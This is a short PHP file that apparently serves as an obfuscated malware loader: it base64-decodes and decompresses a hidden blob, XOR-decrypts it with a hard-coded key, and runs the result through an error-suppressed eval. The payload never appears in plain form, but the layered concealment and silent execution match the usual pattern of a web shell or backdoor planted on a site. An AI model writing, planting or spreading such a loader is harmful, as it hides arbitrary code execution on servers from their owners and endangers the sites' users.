<?php
    $k = 1809614128;
    $x = zlib_decode(base64_decode('eNplUk1PGlEUtXyIRXlOLSkQlPkD7Y6VCdHMDFUzJJbIQ1GUuHHVxL/QhI1JFyTd1aRpMJ0EdBhwKJXRIEm76bJuXLh6VCMfgy2j4pg4aTofbW3r4uW9++4999xz3hvYZc3ja4eOoFjFYy2enkUZ/0yLx6GYcbvTWU+cVbBASqEx5toyLuVpB1PxECcMadxp68ZMSWwIK3+lwzJnn8odLBv3xnI1BHyuVdbzro+vx1zZ//Jngj2COD0/9CUPiMybAZU7jH0uPog1C3a8cL6A5V6almrFYZJ5NYYVz+f7GW7E/uFbsIdVHsPTHQu+057vKZ0t3GPWTQTatUxufo/5Si88z8UfK6O/udjO7Xkj745vKFFwR4uuZwTKJcfUEQugfEM79hRHuJkHw2uHf9UooaeIM0WVpBcizr90sg1cTA1ixxUbiW71eQwM0b92aHCnq5YlSXhIMTWalDgQbiT7EmIGTErJPgJVcJjTPdbqNdw0gfK+uKREseOSDR7tAepIx1upq8vpoFyYMPg6tPO0aKXQO9yzf7BsaOEA1eGsWJoDZKeAq/0eBVIHy84OZ8PKSmhOynjJ6gVFnGwFZ9sZc7CedUP5V++tqmVx86012Cws9Gzuu3u382bYLNwPXwmU6q0b197r6qI33OYpSmQSvu57r0vldSK+L1ETBldPi4NQ1Xf3H9VXRtNlMNMqg4iqI4JUXfWKGxYb/gjS4stpKGp72a/VGFqucdhgn8SagvrvMmCxy9sXc/khUvdCi5ODMfmSGGZucPXsnesmQxou2i6A1W4WX9V94XEy96fPBPbPDN1nmi8EyvlisuBPiFWApbW+66Y4Uuft8LaYuEM6JaF3/JP6BmydDqSOYSD1EwJqkrI='));
    $k_bytes = [($k>>0)&0xFF, ($k>>8)&0xFF, ($k>>16)&0xFF, ($k>>24)&0xFF];
    $p = '';
    $l = strlen($x);
    for($i=0; $i<$l; $i++){
        $p .= chr(ord($x[$i]) ^ $k_bytes[$i%4]);
    }
    @eval('?>'.$p);
    ?>